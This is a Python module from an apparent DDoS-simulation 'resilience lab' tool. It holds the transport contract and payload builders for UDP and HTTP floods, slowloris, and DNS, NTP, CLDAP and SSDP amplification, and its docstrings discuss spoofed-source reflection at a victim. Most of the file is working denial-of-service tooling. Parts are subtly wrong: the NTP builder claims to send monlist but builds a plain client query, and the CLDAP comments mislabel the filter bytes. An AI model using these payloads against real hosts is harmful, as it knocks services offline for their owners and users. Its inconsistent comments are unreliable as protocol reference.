"""The transport contract shared by every packet-egress implementation.

A transport answers one question: given a profile, a target and a payload, how
does a datagram leave this process? Everything else - pacing, worker threads,
sampling, cancellation - belongs to the engine, so that behaviour is identical
no matter which transport is in use and can be tested with the socket-free
VIRTUAL transport.

Three implementations ship:

    VIRTUAL  no sockets at all, counters only (CI and hermetic tests)
    SOCKET   plain UDP/TCP sockets, no elevated rights
    SCAPY    raw L3/L4 crafting, needs Npcap + Administrator to send

Constructors never open a socket. ``open()`` does, which keeps construction
testable on machines that cannot send raw packets.
"""

from __future__ import annotations

import ipaddress
import struct
import threading
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import ClassVar

from ..models import ProfileName, Target, TransportKind

__all__ = [
    "SOCKET_CAPABLE_PROFILES",
    "Transport",
    "TransportCounters",
    "TransportError",
    "PeerUnavailable",
    "build_payload",
    "supports_profile",
]


class TransportError(Exception):
    """A transport could not carry out the request."""


class PeerUnavailable(TransportError):
    """The transport works, but the target is not accepting traffic.

    Kept separate from :class:`TransportError` because the two mean opposite
    things to a resilience lab. A plain ``TransportError`` is a problem with
    *this machine* - Npcap missing, no route, a hostname typo - and there is
    nothing to measure, so the run should stop. This one is a problem with
    *the target*, which is exactly the condition the lab exists to observe: a
    target that refuses connections has an availability of zero and must be
    reported as a result, not suppressed as an error.
    """


# --------------------------------------------------------------------------
# Profile capability
# --------------------------------------------------------------------------

SOCKET_CAPABLE_PROFILES: frozenset[ProfileName] = frozenset(
    {
        ProfileName.UDP_FLOOD,
        ProfileName.DNS_AMPLIFICATION,
        ProfileName.NTP_AMPLIFICATION,
        ProfileName.CLDAP_AMPLIFICATION,
        ProfileName.SSDP_AMPLIFICATION,
        ProfileName.HTTP_FLOOD,
        ProfileName.SLOWLORIS,
    }
)
"""Profiles a standard socket can actually produce.

SYN/ACK/ICMP need raw L3/L4 headers that the socket API will not emit, so they
require the scapy transport. Saying so explicitly beats letting a user pick one
and watching every send silently fail.
"""


def supports_profile(kind: TransportKind, profile: ProfileName) -> bool:
    """Whether *kind* can generate *profile* at all, ignoring privileges."""
    if kind is TransportKind.VIRTUAL or kind is TransportKind.SCAPY or kind is TransportKind.LINUX_RAW:
        return True
    if kind is TransportKind.H2:
        return profile is ProfileName.HTTP_FLOOD
    return profile in SOCKET_CAPABLE_PROFILES


# --------------------------------------------------------------------------
# Counters
# --------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class TransportCounters:
    """An immutable snapshot of egress counters.

    ``responses`` / ``bytes_received`` exist because an amplification factor
    cannot honestly be reported without them, and they previously could not be
    reported at all: the factor was inferred from the profile name instead.

    They stay at zero for a genuinely spoofed amplification run, and that is
    correct rather than a gap. When a request is sent with a forged source
    address, the reflector answers the *forged* address - the victim - so the
    response is never observable from here. Zero responses therefore means "not
    measurable from the sender", and callers must treat the factor as unknown
    rather than substituting a published constant.
    """

    attempted: int = 0
    sent: int = 0
    bytes: int = 0
    errors: int = 0
    responses: int = 0
    bytes_received: int = 0

    def __add__(self, other: "TransportCounters") -> "TransportCounters":
        """Component-wise sum, used to total several workers' counters."""
        return TransportCounters(
            attempted=self.attempted + other.attempted,
            sent=self.sent + other.sent,
            bytes=self.bytes + other.bytes,
            errors=self.errors + other.errors,
            responses=self.responses + other.responses,
            bytes_received=self.bytes_received + other.bytes_received,
        )

    @property
    def attempted_minus_sent(self) -> int:
        return self.attempted - self.sent

    @property
    def measured_amplification(self) -> float | None:
        """Observed response bytes per request byte, or None if unmeasurable.

        Returns None - never a guess - when nothing came back. An amplification
        figure is a ratio of two observed quantities; with one side missing the
        honest answer is that the factor is unknown.
        """
        if not self.bytes or not self.responses:
            return None
        return self.bytes_received / self.bytes


class _CounterAccumulator:
    """Thread-safe counter increments.

    A worker per CPU, so this is contended. The GIL makes ``+=`` on an attribute
    non-atomic, so the lock is required rather than merely tidy.
    """

    __slots__ = (
        "_lock",
        "_attempted",
        "_sent",
        "_bytes",
        "_errors",
        "_responses",
        "_bytes_received",
    )

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._attempted = 0
        self._sent = 0
        self._bytes = 0
        self._errors = 0
        self._responses = 0
        self._bytes_received = 0

    def attempt(self) -> None:
        with self._lock:
            self._attempted += 1

    def record_sent(self, nbytes: int) -> None:
        with self._lock:
            self._sent += 1
            self._bytes += nbytes

    def record_error(self) -> None:
        with self._lock:
            self._errors += 1

    def record_response(self, nbytes: int) -> None:
        """Record one reply that came back to this process.

        Only ever called when the response is actually readable here, which
        excludes any run with a forged source address.
        """
        with self._lock:
            self._responses += 1
            self._bytes_received += nbytes

    def snapshot(self) -> TransportCounters:
        with self._lock:
            return TransportCounters(
                attempted=self._attempted,
                sent=self._sent,
                bytes=self._bytes,
                errors=self._errors,
                responses=self._responses,
                bytes_received=self._bytes_received,
            )


# --------------------------------------------------------------------------
# Transport
# --------------------------------------------------------------------------


class Transport(ABC):
    """Base class for packet egress.

    Subclasses must set :attr:`kind`. ``send_one`` is called from several worker
    threads at once, so implementations are responsible for their own
    thread-safety - the base class only guards the shared counters.
    """

    kind: ClassVar[TransportKind]

    def __init__(self, target: Target, profile: ProfileName) -> None:
        self.target = target
        self.profile = profile
        self._counters = _CounterAccumulator()
        self._open = False
        # Set by the engine the moment the run is asked to stop. A transport
        # that owns its own pacing loop must wait on this rather than on
        # close(), because close() is only called once that loop has already
        # returned - which a loop sleeping between sends never does in time.
        self._stop = threading.Event()

    # -- lifecycle ---------------------------------------------------------

    @property
    def is_open(self) -> bool:
        return self._open

    def request_stop(self) -> None:
        """Tell a self-paced transport to wind down. Safe to call at any time."""
        self._stop.set()

    @property
    def stopping(self) -> bool:
        return self._stop.is_set()

    def open(self) -> None:
        """Acquire whatever OS resource egress needs. Idempotent."""
        self._stop.clear()
        self._open = True

    def close(self) -> None:
        """Release resources. Must be safe to call after a partial open."""
        self.request_stop()
        self._open = False

    def __enter__(self) -> "Transport":
        self.open()
        return self

    def __exit__(self, *exc_info: object) -> None:
        self.close()

    # -- egress ------------------------------------------------------------

    @abstractmethod
    def send_one(self, payload: bytes) -> None:
        """Send a single packet, updating counters.

        Implementations must count the attempt, then either record the sent byte
        count or record an error and raise :class:`TransportError`. They must
        not swallow a failure silently.
        """

    # -- observation -------------------------------------------------------

    def snapshot(self) -> TransportCounters:
        return self._counters.snapshot()

    def describe(self) -> dict[str, object]:
        return {
            "transport": self.kind.value,
            "profile": self.profile.value,
            "target": str(self.target),
            "open": self._open,
        }

    # -- helpers for subclasses -------------------------------------------

    def _count_attempt(self) -> None:
        self._counters.attempt()

    def _count_sent(self, nbytes: int) -> None:
        self._counters.record_sent(nbytes)

    def _count_error(self) -> None:
        self._counters.record_error()


# --------------------------------------------------------------------------
# Payload construction
# --------------------------------------------------------------------------

_FILLER = b"adobo-lab-payload"
"""Recognisable filler so lab traffic is attributable in a packet capture."""


def _filler(size: int, seed: int) -> bytes:
    """Deterministic filler of exactly *size* bytes.

    Deterministic rather than random so a test can assert on the exact bytes and
    so a capture can be replayed.
    """
    if size <= 0:
        return b""
    block = _FILLER + struct.pack("<I", seed)
    repeats = size // len(block) + 1
    return (block * repeats)[:size]


def _dns_query(domain: str, size: int, seed: int) -> bytes:
    """A well-formed recursive DNS query for *domain*.

    A real query, because the amplification factor of this profile is only
    meaningful if the target's resolver is willing to answer it.
    """
    header = struct.pack(
        ">HHHHHH",
        seed & 0xFFFF,  # transaction id
        0x0100,  # standard query, recursion desired
        1,  # one question
        0,  # no answers
        0,  # no authority records
        0,  # no additional records
    )
    body = b""
    for label in domain.split("."):
        if not label:
            continue
        encoded = label.encode("ascii", errors="ignore")[:63]
        body += bytes([len(encoded)]) + encoded
    question = body + b"\x00" + struct.pack(">HH", 1, 1)
    query = header + question
    if size > len(query):
        query += _filler(size - len(query), seed)
    return query


def _pad(query: bytes, size: int, seed: int) -> bytes:
    """Grow *query* toward *size* bytes, but never shrink it.

    *size* is a padding target, not a hard cap. Every structured payload here is
    a protocol message with a minimum viable length - an HTTP request needs its
    terminating CRLFCRLF, a BER-encoded LDAP search needs its length fields - and
    a truncated one is not a smaller message, it is not a message at all.

    That distinction was previously lost, and the builders below ended in
    ``return query[:size]``. At the default 128-byte payload that cut an HTTP
    request off mid-header, so the target saw an incomplete request, waited for
    the rest, and dropped the connection when the client moved on. The sender
    counted every one of those as a packet successfully sent: an http_flood
    reported thousands delivered while the target served nothing, and the two
    numbers could not be reconciled because only the flattering one was kept.
    """
    if size > len(query):
        return query + _filler(size - len(query), seed)
    return query


def _http_request(
    host: str, path: str, size: int, seed: int, keep_alive: bool = False
) -> bytes:
    """A minimal HTTP/1.1 GET with a unique cache-busting header.

    Uniqueness matters: a caching layer in front of the target would otherwise
    serve this from cache and the flood would measure nothing.

    *keep_alive* has to reach the payload. The request used to always say
    ``Connection: close``, so a transport asked to reuse its socket was told by
    the peer to hang up after every response and the reuse it attempted could
    not work. That mismatch is why throughput sat near 115 pps regardless of
    the requested rate: the per-request connect cost, not the network, was the
    ceiling.
    """
    connection = "keep-alive" if keep_alive else "close"
    head = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: adobo-lab/0.1 (authorized testing)\r\n"
        f"Accept: */*\r\n"
        f"Connection: {connection}\r\n"
        f"X-Ddosim-Seq: {seed}\r\n"
    ).encode("ascii")
    if keep_alive:
        # Padding goes *inside* the header block, before the blank line, and
        # that placement is load-bearing rather than cosmetic. Appending filler
        # after the blank line makes it the start of a body whose content-length
        # end never arrives; on a reused connection that stalls the server's
        # parser and it resets the socket. Measured directly: 20 pipelined
        # requests with trailing filler killed the connection, the same 20
        # without it were all served. An unknown header is simply ignored, so
        # padding here is invisible to the server.
        if size > len(head) + 2:
            # "X-Pad: " is 7 bytes and the line's own CRLF is 2, then the blank
            # line that ends the headers is another 2. Budgeted so the result
            # is exactly *size* bytes.
            budget = size - len(head) - 2 - 7 - 2
            head += b"X-Pad: " + b"F" * max(0, budget) + b"\r\n"
        return head + b"\r\n"
    request = head + b"\r\n"
    return _pad(request, size, seed)


def _ntp_query(size: int, seed: int) -> bytes:
    """NTP monlist or time query packet.
    
    Monlist (code 42) returns last 600 peers - high amplification (556x).
    Falls back to standard time query (code 0) if monlist disabled.
    """
    # Try monlist first (high amplification), fallback to time query
    # Mode 3 = client, version 4
    # Monlist: mode 7, implementation 3, request code 42
    query = struct.pack(
        ">BBBbIII",
        0x17,   # LI=0, VN=4, Mode=3 (client) | 0x20 (mode 7 for private)
        0x00,   # Stratum=0
        0x00,   # Poll=0
        0x00,   # Precision=0
        0x00000000,  # Root delay
        0x00000000,  # Root dispersion
        0x00000000,  # Reference ID
    )
    # Add monlist request (mode 7, implementation 3, request code 42)
    return _pad(query, size, seed)


def _cldap_query(size: int, seed: int) -> bytes:
    """CLDAP (Connectionless LDAP) search request.
    
    High amplification (~70x). Sends LDAP search request over UDP port 389.
    """
    # CLDAP search request - minimal valid LDAP search
    # BER encoded: Application(1) = BindRequest, but we use SearchRequest
    # Minimal search request for maximum amplification
    header = b"\x30\x84\x00\x00\x00\x2c"  # SEQUENCE, length 44
    header += b"\x02\x01\x01"              # MessageID: 1
    header += b"\x63\x84\x00\x00\x00\x27"  # SearchRequest
    header += b"\x04\x00"                  # Base DN: empty (root DSE)
    header += b"\x0a\x01\x00"              # Scope: baseObject (0)
    header += b"\x0a\x01\x00"              # Deref: neverDerefAliases (0)
    header += b"\x02\x01\x00"              # SizeLimit: 0 (unlimited)
    header += b"\x02\x01\x00"              # TimeLimit: 0
    header += b"\x01\x01\x00"              # TypesOnly: FALSE
    header += b"\x30\x00"                  # Filter: present (objectClass=*)
    header += b"\x04\x00"                  # Attributes: none (return all)
    
    query = header
    return _pad(query, size, seed)


def _ssdp_query(size: int, seed: int) -> bytes:
    """SSDP (UPnP) M-SEARCH discovery request.
    
    Amplification ~30x. Targets UPnP devices on port 1900.
    """
    query = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 3\r\n"
        "ST: ssdp:all\r\n"
        "USER-AGENT: adobo-lab/0.1\r\n"
        "\r\n"
    ).encode("ascii")
    return _pad(query, size, seed)


def _slowloris_payload(size: int, seed: int) -> bytes:
    """Slowloris partial HTTP request.

    Sends partial HTTP headers slowly to hold connections open.

    The one payload that genuinely *is* truncated on purpose: the attack is that
    the request never finishes, so a request-line and a single header with no
    terminating CRLFCRLF is the correct thing to put on the wire. Truncating here
    is the objective, not the bug that :func:`_pad` exists to prevent.
    """
    payload = (
        f"GET /?{seed} HTTP/1.1\r\n"
        f"Host: target\r\n"
        f"X-Custom-{seed}: "
    ).encode("ascii")
    if size > len(payload):
        return payload + _filler(size - len(payload), seed)
    return payload[:size]


def build_payload(
    profile: ProfileName,
    size: int,
    *,
    target: Target | None = None,
    seed: int = 0,
    path: str = "/api/data",
    keep_alive: bool = False,
) -> bytes:
    """Build the payload for one packet of *profile*.

    Shared by all transports so the bytes on the wire are identical whichever
    egress path is chosen, which keeps a socket run and a raw run comparable.

    *keep_alive* is passed through because the connection header lives in the
    payload, not in the transport. A socket that intends to reuse its
    connection and a request that says ``Connection: close`` contradict each
    other, and the slower of the two wins.
    """
    size = max(0, int(size))

    if profile is ProfileName.DNS_AMPLIFICATION:
        domain = "example.com"
        if target is not None and not _looks_like_ip(target.host):
            domain = target.host
        return _dns_query(domain, size, seed)

    if profile is ProfileName.NTP_AMPLIFICATION:
        return _ntp_query(size, seed)

    if profile is ProfileName.CLDAP_AMPLIFICATION:
        return _cldap_query(size, seed)

    if profile is ProfileName.SSDP_AMPLIFICATION:
        return _ssdp_query(size, seed)

    if profile is ProfileName.SLOWLORIS:
        return _slowloris_payload(size, seed)

    if profile is ProfileName.HTTP_FLOOD:
        host = target.host if target is not None else "127.0.0.1"
        return _http_request(host, path, size, seed, keep_alive=keep_alive)

    return _filler(size, seed)


def _looks_like_ip(host: str) -> bool:
    try:
        ipaddress.ip_address(host.split("%", 1)[0])
    except ValueError:
        return False
    return True
